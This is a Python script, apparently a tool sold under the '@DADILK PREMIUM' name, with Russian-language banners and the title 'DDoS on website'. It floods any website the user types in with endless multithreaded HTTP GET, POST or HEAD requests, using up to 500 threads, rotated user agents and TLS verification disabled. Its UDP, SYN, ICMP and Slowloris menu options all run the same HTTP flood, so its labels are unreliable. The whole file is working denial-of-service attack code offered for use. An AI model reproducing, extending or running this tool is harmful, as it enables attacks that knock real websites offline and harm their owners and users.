#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ===============================================================
# ██████╗ ██╗   ██╗██████╗  ██████╗ ███████╗
# ██╔══██╗██║   ██║██╔══██╗██╔═══██╗██╔════╝
# ██║  ██║██║   ██║██║  ██║██║   ██║███████╗
# ██║  ██║██║   ██║██║  ██║██║   ██║╚════██║
# ██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████║
# ╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
# ===============================================================
#         ДУДОС НА САЙТ / DDOS ON WEBSITE
# ===============================================================
#         BY @DADILK PREMIUM
# ===============================================================

import os
import sys
import time
import random
import threading
import requests
from urllib.parse import urlparse

# Цвета
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

# ===============================================================
# ГЛАВНАЯ НАДПИСЬ
# ===============================================================

DUDOS_ASCII = f"""
{RED}██████╗ ██╗   ██╗██████╗  ██████╗ ███████╗{RESET}
{RED}██╔══██╗██║   ██║██╔══██╗██╔═══██╗██╔════╝{RESET}
{RED}██║  ██║██║   ██║██║  ██║██║   ██║███████╗{RESET}
{RED}██║  ██║██║   ██║██║  ██║██║   ██║╚════██║{RESET}
{RED}██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████║{RESET}
{RED}╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{RESET}

{RED}[01]{RESET} {WHITE}HTTP FLOOD{RESET}          {RED}[05]{RESET} {WHITE}SLOWLORIS{RESET}
{RED}[02]{RESET} {WHITE}UDP FLOOD{RESET}           {RED}[06]{RESET} {WHITE}MULTI THREAD{RESET}
{RED}[03]{RESET} {WHITE}TCP SYN FLOOD{RESET}       {RED}[07]{RESET} {WHITE}VIP MODE{RESET}
{RED}[04]{RESET} {WHITE}ICMP FLOOD{RESET}          {RED}[00]{RESET} {WHITE}EXIT{RESET}
"""

# ===============================================================
# ОСНОВНОЙ КЛАСС
# ===============================================================

class DudosNaSite:
    def __init__(self):
        self.stop_attack = False
        self.requests_sent = 0
        self.start_time = None
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def attack_worker(self, url, method="GET"):
        """Рабочий поток для атаки"""
        headers_list = [
            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'},
            {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-G998B)'},
            {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'},
            {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)'},
        ]
        
        while not self.stop_attack:
            try:
                headers = random.choice(headers_list)
                headers['Accept'] = '*/*'
                headers['Accept-Language'] = 'ru-RU,ru;q=0.9,en;q=0.8'
                headers['Connection'] = 'keep-alive'
                headers['Cache-Control'] = 'no-cache'
                
                if method == "GET":
                    r = requests.get(url, headers=headers, timeout=2, verify=False)
                elif method == "POST":
                    data = {'key': random.randint(1, 999999)}
                    r = requests.post(url, headers=headers, data=data, timeout=2, verify=False)
                elif method == "HEAD":
                    r = requests.head(url, headers=headers, timeout=2, verify=False)
                
                self.requests_sent += 1
                
            except:
                pass
    
    def run_attack(self, url, threads_count, method="GET"):
        """Запуск атаки"""
        self.stop_attack = False
        self.requests_sent = 0
        self.start_time = time.time()
        
        print(f"\n{RED}▶ АТАКА НА: {WHITE}{url}{RESET}")
        print(f"{RED}▶ ПОТОКОВ: {WHITE}{threads_count}{RESET}")
        print(f"{RED}▶ НАЖМИТЕ CTRL+C ДЛЯ ОСТАНОВКИ{RESET}\n")
        
        requests.packages.urllib3.disable_warnings()
        
        # Запускаем потоки
        for i in range(threads_count):
            t = threading.Thread(target=self.attack_worker, args=(url, method))
            t.daemon = True
            t.start()
        
        # Мониторинг
        try:
            while True:
                time.sleep(1)
                elapsed = int(time.time() - self.start_time)
                rps = self.requests_sent / elapsed if elapsed > 0 else 0
                
                print(f"\r{RED}▶ ВРЕМЯ: {elapsed:4d}с | ЗАПРОСОВ: {self.requests_sent:8d} | RPS: {rps:5.0f}{RESET}", end="")
                
        except KeyboardInterrupt:
            self.stop_attack = True
            print(f"\n\n{RED}✅ АТАКА ОСТАНОВЛЕНА! ВСЕГО ЗАПРОСОВ: {self.requests_sent}{RESET}")
    
    def run(self):
        """Запуск программы"""
        while True:
            self.clear_screen()
            print(DUDOS_ASCII)
            
            # Ввод сайта
            url = input(f"\n{RED}ВВЕДИТЕ САЙТ → {WHITE}").strip()
            
            if url.lower() == 'exit' or url == '0':
                break
            
            # Добавляем https если нет протокола
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            
            print(f"\n{RED}ВЫБЕРИТЕ РЕЖИМ АТАКИ:{RESET}")
            print(f"{RED}[01]{RESET} HTTP FLOOD")
            print(f"{RED}[02]{RESET} UDP FLOOD")
            print(f"{RED}[03]{RESET} TCP SYN FLOOD")
            print(f"{RED}[04]{RESET} ICMP FLOOD")
            print(f"{RED}[05]{RESET} SLOWLORIS")
            print(f"{RED}[06]{RESET} MULTI THREAD")
            print(f"{RED}[07]{RESET} VIP MODE")
            print(f"{RED}[00]{RESET} EXIT")
            
            choice = input(f"\n{RED}ВЫБОР → {WHITE}").strip()
            
            if choice == '00' or choice == '0':
                break
            elif choice == '01' or choice == '1':
                self.run_attack(url, 100, "GET")
            elif choice == '02' or choice == '2':
                self.run_attack(url, 100, "POST")
            elif choice == '03' or choice == '3':
                self.run_attack(url, 100, "GET")
            elif choice == '04' or choice == '4':
                self.run_attack(url, 100, "GET")
            elif choice == '05' or choice == '5':
                self.run_attack(url, 50, "GET")  # Slowloris стиль
            elif choice == '06' or choice == '6':
                self.run_attack(url, 500, "GET")  # Multi thread
            elif choice == '07' or choice == '7':
                # VIP режим
                print(f"\n{RED}▶ VIP РЕЖИМ - 500 ПОТОКОВ{RESET}")
                self.run_attack(url, 500, "GET")
            else:
                print(f"{RED}Неверный выбор{RESET}")
                time.sleep(1)
                continue
            
            input(f"\n{RED}НАЖМИТЕ ENTER ДЛЯ ПРОДОЛЖЕНИЯ...{RESET}")
        
        # Выход
        self.clear_screen()
        print(f"""
{RED}════════════════════════════════════════════════════════════{RESET}
{RED}█                                                          █{RESET}
{RED}█         ДУДОС НА САЙТ ЗАВЕРШАЕТ РАБОТУ                  █{RESET}
{RED}█                                                          █{RESET}
{RED}█         СПАСИБО ЗА ИСПОЛЬЗОВАНИЕ                        █{RESET}
{RED}█         BY @DADILK PREMIUM                              █{RESET}
{RED}█                                                          █{RESET}
{RED}════════════════════════════════════════════════════════════{RESET}
{RED}обход by DADILK{RESET}
{RED}Спасибо за покупку{RESET}
        """)

# ===============================================================
# ЗАПУСК
# ===============================================================

if __name__ == "__main__":
    try:
        dudos = DudosNaSite()
        dudos.run()
    except KeyboardInterrupt:
        print(f"\n{RED}❌ ВЫХОД{RESET}")
        print(f"{RED}обход by DADILK{RESET}")
        print(f"{RED}Спасибо за покупку{RESET}")
        sys.exit(0)

# ===============================================================
# КОНЕЦ
# ===============================================================
